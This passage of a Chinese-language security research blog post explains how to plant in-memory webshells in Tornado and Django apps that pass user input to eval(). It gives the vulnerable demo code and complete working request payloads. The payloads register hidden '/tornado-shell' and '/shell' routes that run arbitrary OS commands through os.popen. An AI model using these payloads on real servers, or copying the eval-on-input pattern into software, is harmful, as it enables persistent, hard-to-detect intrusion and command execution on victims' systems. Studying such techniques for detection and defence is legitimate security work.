</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainHandler</span>(tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>RequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> eval(self<span style="color:#f92672">.</span>get_argument(<span style="color:#e6db74">&#39;expression&#39;</span>))
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&lt;h2&gt;result: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">!&lt;/h2&gt;&#39;</span> <span style="color:#f92672">%</span> result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_app</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>Application([
</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;/&#34;</span>, MainHandler),
</span></span><span style="display:flex;"><span>    ], debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, autoreload<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> make_app()
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5000</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;listen: 5000&#34;</span>)
</span></span><span style="display:flex;"><span>    tornado<span style="color:#f92672">.</span>ioloop<span style="color:#f92672">.</span>IOLoop<span style="color:#f92672">.</span>instance()<span style="color:#f92672">.</span>start()
</span></span></code></pre></div><h3 id="32-种植方法">3.2 种植方法<a hidden class="anchor" aria-hidden="true" href="#32-种植方法">#</a></h3>
<p><code>Tornado</code> 的路由一般情况下都会在实例化 <code>tornado.web.Application</code> 的时候传入，最初想到的办法和 <code>flask</code> 相同，考虑是否能找到其中存放路由的列表来直接操作，在阅读 <code>Application</code> 的代码时确实发现在构造函数中存在这样的列表。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> __init__(
</span></span><span style="display:flex;"><span>        self,
</span></span><span style="display:flex;"><span>        handlers: Optional[_RuleList] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>        default_host: Optional[str] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>        transforms: Optional[List[Type[<span style="color:#e6db74">&#34;OutputTransform&#34;</span>]]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">**</span>settings: Any,
</span></span><span style="display:flex;"><span>    ) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wildcard_router <span style="color:#f92672">=</span> _ApplicationRouter(self, handlers)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>default_router <span style="color:#f92672">=</span> _ApplicationRouter(
</span></span><span style="display:flex;"><span>                self, [Rule(AnyMatches(), self<span style="color:#f92672">.</span>wildcard_router)]
</span></span><span style="display:flex;"><span>        )
</span></span></code></pre></div><p>而在继续向下阅读的时候，发现在 <code>Application</code> 类中存在一个类似于 <code>flask</code> 中 <code>add_url_rule</code> 的函数 <code>add_handlers</code>，这个函数用来支持配置虚拟主机，并且在之后会将指定的路由加入当前的路由表中。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_handlers</span>(self, host_pattern: str, host_handlers: _RuleList) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Appends the given handlers to our handler list.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Host patterns are processed sequentially in the order they were
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    added. All matching patterns will be considered.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    host_matcher <span style="color:#f92672">=</span> HostMatches(host_pattern)
</span></span><span style="display:flex;"><span>    rule <span style="color:#f92672">=</span> Rule(host_matcher, _ApplicationRouter(self, host_handlers))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>default_router<span style="color:#f92672">.</span>rules<span style="color:#f92672">.</span>insert(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, rule)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>default_host <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>     self<span style="color:#f92672">.</span>wildcard_router<span style="color:#f92672">.</span>add_rules(
</span></span><span style="display:flex;"><span>    [(DefaultHostMatches(self, host_matcher<span style="color:#f92672">.</span>host_pattern), host_handlers)] )
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_rules</span>(self, rules: _RuleList) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Appends new rules to the router.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    :arg rules: a list of Rule instances (or tuples of arguments, which are
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    passed to Rule constructor).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> rule <span style="color:#f92672">in</span> rules:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(rule, (tuple, list)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(rule) <span style="color:#f92672">in</span> (<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(rule[<span style="color:#ae81ff">0</span>], basestring_type):
</span></span><span style="display:flex;"><span>            rule <span style="color:#f92672">=</span> Rule(PathMatches(rule[<span style="color:#ae81ff">0</span>]), <span style="color:#f92672">*</span>rule[<span style="color:#ae81ff">1</span>:])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            rule <span style="color:#f92672">=</span> Rule(<span style="color:#f92672">*</span>rule)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>rules<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>process_rule(rule))
</span></span></code></pre></div><p>既然有一个现成的函数可供调用，那么就可以放弃去直接操作列表，转而考虑怎么来构造这个函数的参数。</p>
<h3 id="33-参数构造">3.3 参数构造<a hidden class="anchor" aria-hidden="true" href="#33-参数构造">#</a></h3>
<p>首先看到这个函数声明接受两个参数 <code>host_pattern</code> 和 <code>host_handlers</code>，其中 <code>host_pattern</code> 是一个字符串没有什么需要多考虑的，这个场景下直接构造 <code>.*</code> 匹配所有域名即可，而第二个参数 <code>host_handlers</code> 较为复杂一点，类型为 <code>_RuleList</code>，查看一下这个类型定义。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>_RuleList <span style="color:#f92672">=</span> List[
</span></span><span style="display:flex;"><span>    Union[
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Rule&#34;</span>,
</span></span><span style="display:flex;"><span>        List[Any],  <span style="color:#75715e"># Can&#39;t do detailed typechecking of lists.</span>
</span></span><span style="display:flex;"><span>        Tuple[Union[str, <span style="color:#e6db74">&#34;Matcher&#34;</span>], Any],
</span></span><span style="display:flex;"><span>        Tuple[Union[str, <span style="color:#e6db74">&#34;Matcher&#34;</span>], Any, Dict[str, Any]],
</span></span><span style="display:flex;"><span>        Tuple[Union[str, <span style="color:#e6db74">&#34;Matcher&#34;</span>], Any, Dict[str, Any], str],
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>在 <code>add_rules</code> 中，整个传入的值都会被作为构造参数来实例化一个 <code>Rule</code> 对象，构造函数如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> __init__(
</span></span><span style="display:flex;"><span>    self,
</span></span><span style="display:flex;"><span>    matcher: <span style="color:#e6db74">&#34;Matcher&#34;</span>,
</span></span><span style="display:flex;"><span>    target: Any,
</span></span><span style="display:flex;"><span>    target_kwargs: Optional[Dict[str, Any]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>    name: Optional[str] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span></code></pre></div><p>第一个参数类型为 <code>Matcher</code>，如果自己来构造的话会比较麻烦，但是看到 <code>add_rules</code> 中的处理，会判断一次传入值，如果是 <code>tuple</code> 或者 <code>list</code> 并且第一个值是字符串，那么就会调用一次 <code>PathMatches</code> 返回一个 <code>Matcher</code> 对象，所以这里考虑直接传入路由字符串，让系统来做一次自动转换。</p>
<p>接下来考虑路由对应的 <code>handler</code>, 这往往需要是一个 <code>tornado.web.RequestHandler</code> 的子类，那么这里可以直接使用 <code>type</code> 函数来创建一个对应基类的对象，当 <code>type</code> 函数接受三个参数时，第一个参数为类名，第二个参数为基类元组，第三个参数为类属性/方法的字典，函数原型如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@overload</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> __init__(self, name: str, bases: tuple[type, <span style="color:#f92672">...</span>], dict: dict[str, Any], <span style="color:#f92672">/</span>, <span style="color:#f92672">**</span>kwds: Any) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>: <span style="color:#f92672">...</span>
</span></span></code></pre></div><p>所以使用下面的payload即可创建一个合法 <code>RequestHandler</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>type(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ShellHandler&#39;</span>,
</span></span><span style="display:flex;"><span>    (tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>RequestHandler,),
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;get&#39;</span>: <span style="color:#66d9ef">lambda</span> self: self<span style="color:#f92672">.</span>write(__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(sef<span style="color:#f92672">.</span>get_argument(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>))<span style="color:#f92672">.</span>read()) 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><h3 id="34-结果">3.4 结果<a hidden class="anchor" aria-hidden="true" href="#34-结果">#</a></h3>
<p>将所有分析结合起来，即可在当前场景下构造出下面的请求payload。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>expression<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>add_handlers(<span style="color:#e6db74">&#39;.*&#39;</span>, [<span style="color:#e6db74">&#39;/tornado-shell&#39;</span>, type(<span style="color:#e6db74">&#39;ShellHandler&#39;</span>, (tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>RequestHandler,), {<span style="color:#e6db74">&#39;get&#39;</span>: <span style="color:#66d9ef">lambda</span> self: self<span style="color:#f92672">.</span>write(__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(self<span style="color:#f92672">.</span>get_argument(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>))<span style="color:#f92672">.</span>read())})])
</span></span></code></pre></div><p>在发出这条请求之后，应用正常返回。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/6e9eef1d-1e73-4613-ac65-fae895229f49.png" alt=""  />
</p>
<p>之后便可以访问 <code>/tornado-shell</code> 来执行任意系统命令。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/76c777a8-f76f-4093-bf24-ca11ea6b2981.png" alt=""  />
</p>
<h2 id="四django">四、Django<a hidden class="anchor" aria-hidden="true" href="#四django">#</a></h2>
<h3 id="41-场景代码">4.1 场景代码<a hidden class="anchor" aria-hidden="true" href="#41-场景代码">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># memshell/urls.py</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> django.contrib <span style="color:#f92672">import</span> admin
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> django.urls <span style="color:#f92672">import</span> path
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> .views <span style="color:#f92672">import</span> calc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>urlpatterns <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    path(<span style="color:#e6db74">&#39;admin/&#39;</span>, admin<span style="color:#f92672">.</span>site<span style="color:#f92672">.</span>urls),
</span></span><span style="display:flex;"><span>    path(<span style="color:#e6db74">&#39;calc&#39;</span>, calc)
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># memshell/views.py</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> django.http <span style="color:#f92672">import</span> HttpResponse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calc</span>(request):
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> eval(request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;expression&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> HttpResponse(<span style="color:#e6db74">&#39;&lt;h2&gt;result: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">!&lt;/h2&gt;&#39;</span> <span style="color:#f92672">%</span> result)
</span></span></code></pre></div><p>虽然 <code>Django</code> 的代码结构不太相同，但由于所有路由都定义在 <code>app/urls.py#urlpatterns</code> 中，所以大体思路没有什么差别，首先考虑如何获取到这个列表，然后再进行操作。</p>
<h3 id="42-获取appurlpatterns">4.2 获取app.urlpatterns<a hidden class="anchor" aria-hidden="true" href="#42-获取appurlpatterns">#</a></h3>
<p>在 <code>Django</code> 中，root app下会有一个 <code>settings.py</code> 文件用于定义应用配置，其中 <code>ROOT_URLCONF</code> 指定了当前应用路由入口，在当前场景下的 <code>ROOT_URLCONF</code> 为：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROOT_URLCONF <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;memshell.urls&#39;</span>
</span></span></code></pre></div><p>首先考虑如何获取到 <code>settings</code> 这个对象，得益于当前场景下可以使用 <code>request</code>，所以使用其中函数的 <code>__globals__</code> 属性来获取到当前的全局变量字典，其中就可以找到。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/7463b736-ac39-4781-9475-a0f330124c20.png" alt=""  />
</p>
<p>那么直接将其导入，就可以获得当前应用的入口app。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/4e8b53af-51ea-4b25-973f-278bfc44126e.png" alt=""  />
</p>
<p>在这个基础上，就可以通过访问 <code>urls.urlpatterns</code> 来操作路由列表了。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/18206fc1-8779-4a49-96a6-b514ae1d0eac.png" alt=""  />
</p>
<h3 id="43-djangourlspath">4.3 django.urls.path<a hidden class="anchor" aria-hidden="true" href="#43-djangourlspath">#</a></h3>
<p>在路由定义中，每一条路由都会调用 <code>path</code> 函数来进行定义，传入的参数相对也比较简单，就是 <code>路由：函数</code> 的对应，第一个路由参数不需要考虑，传入字符串即可，需要考虑的是如何构造第二个参数，查看 <code>path</code> 函数定义。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_path</span>(route, view, kwargs<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, Pattern<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> django.views <span style="color:#f92672">import</span> View
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> kwargs <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> isinstance(kwargs, dict):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;kwargs argument must be a dict, but got </span><span style="color:#e6db74">{</span>kwargs<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__name__<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(view, (list, tuple)):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># For include(...) processing.</span>
</span></span><span style="display:flex;"><span>        pattern <span style="color:#f92672">=</span> Pattern(route, is_endpoint<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>        urlconf_module, app_name, namespace <span style="color:#f92672">=</span> view
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> URLResolver(
</span></span><span style="display:flex;"><span>            pattern,
</span></span><span style="display:flex;"><span>            urlconf_module,
</span></span><span style="display:flex;"><span>            kwargs,
</span></span><span style="display:flex;"><span>            app_name<span style="color:#f92672">=</span>app_name,
</span></span><span style="display:flex;"><span>            namespace<span style="color:#f92672">=</span>namespace,
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> callable(view):
</span></span><span style="display:flex;"><span>        pattern <span style="color:#f92672">=</span> Pattern(route, name<span style="color:#f92672">=</span>name, is_endpoint<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> URLPattern(pattern, view, kwargs, name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> isinstance(view, View):
</span></span><span style="display:flex;"><span>        view_cls_name <span style="color:#f92672">=</span> view<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__name__
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;view must be a callable, pass </span><span style="color:#e6db74">{</span>view_cls_name<span style="color:#e6db74">}</span><span style="color:#e6db74">.as_view(), not &#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>view_cls_name<span style="color:#e6db74">}</span><span style="color:#e6db74">().&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;view must be a callable or a list/tuple in the case of include().&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span></code></pre></div><p>其中会发现 <code>view</code> 参数除了判断是否为 <code>View</code>、<code>(list, tuple)</code> 之外，还判断了是否是一个可调用对象，那么这里就比较简单了，直接构造一个 <code>lambda</code> 函数即可。</p>
<h3 id="44-请求构造">4.4 请求构造<a hidden class="anchor" aria-hidden="true" href="#44-请求构造">#</a></h3>
<p>根据之前的分析结果，可以得到下面的构造流程：</p>
<ol>
<li>
<p>获取app.urlpatterns</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(request<span style="color:#f92672">.</span>get_port<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;settings&#34;</span>]<span style="color:#f92672">.</span>ROOT_URLCONF)<span style="color:#f92672">.</span>urls<span style="color:#f92672">.</span>urlpatterns
</span></span></code></pre></div></li>
<li>
<p>调用path函数，返回一条新路由</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;django&#39;</span>)<span style="color:#f92672">.</span>urls<span style="color:#f92672">.</span>path(<span style="color:#e6db74">&#39;shell&#39;</span>,<span style="color:#66d9ef">lambda</span> request: __import__(<span style="color:#e6db74">&#39;django&#39;</span>)<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>HttpResponse(__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;cmd&#39;</span>,<span style="color:#e6db74">&#39;id&#39;</span>))<span style="color:#f92672">.</span>read()))
</span></span></code></pre></div><blockquote>
<p>当前场景下需要返回一个 <code>http.HttpResponse</code>，所以需要额外引入 <code>django</code> 来进行调用</p>
</blockquote>
</li>
<li>
<p>将新路由append到app.urlpatterns中实现内存马</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">8000</span><span style="color:#f92672">/</span>calc<span style="color:#960050;background-color:#1e0010">?</span>expression<span style="color:#f92672">=</span>__import__(request<span style="color:#f92672">.</span>get_port<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;settings&#34;</span>]<span style="color:#f92672">.</span>ROOT_URLCONF)<span style="color:#f92672">.</span>urls<span style="color:#f92672">.</span>urlpatterns<span style="color:#f92672">.</span>append(__import__(<span style="color:#e6db74">&#39;django&#39;</span>)<span style="color:#f92672">.</span>urls<span style="color:#f92672">.</span>path(<span style="color:#e6db74">&#39;shell&#39;</span>,<span style="color:#66d9ef">lambda</span> request: __import__(<span style="color:#e6db74">&#39;django&#39;</span>)<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>HttpResponse(__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;cmd&#39;</span>,<span style="color:#e6db74">&#39;id&#39;</span>))<span style="color:#f92672">.</span>read())))
</span></span></code></pre></div></li>
</ol>
<h3 id="45-结果">4.5 结果<a hidden class="anchor" aria-hidden="true" href="#45-结果">#</a></h3>
<p>将构造好的payload发送后，便可通过访问 <code>/shell</code> 来实现任意命令执行。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/1a1b8e25-60c7-48c2-a30d-4562a7c42b94.png" alt=""  />
</p>
<h2 id="五总结">五、总结<a hidden class="anchor" aria-hidden="true" href="#五总结">#</a></h2>
<p>在刚开始寻找Python Web内存马资料的时候，发现除了Flask SSTI之外，找不到除了这个场景、框架之外的其他资料，或许确实在这个条件下的利用场景过于稀少，并且在有RCE的情况下更多的考虑也并不是获取一个webshell。</p>
<p>本文仅在最理想的场景下，简单探讨了一下在三个常见Python Web框架中种植内存马的方法，除了文中提到的思路还有一些其他的方法，比如可以在 <code>Flask</code> 中操作各种reqeust hook函数来实现，或者在 <code>Tornado</code> 直接操作 <code>wildcard_router</code>等，原理上来说都大同小异。</p>


  </div>

  <footer class="post-footer">
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/blog/tiangongarticle039/">
    <span class="title">« 上一页</span>
    <br>
    <span>Rust逆向入门：从反编译视角学习内存模型</span>
  </a>
  <a class="next" href="http://localhost:1313/blog/tiangongarticle005/">
    <span class="title">下一页 »</span>
    <br>
    <span>WAF防护绕过技巧分析</span>
  </a>
</nav>





  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
        

    
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
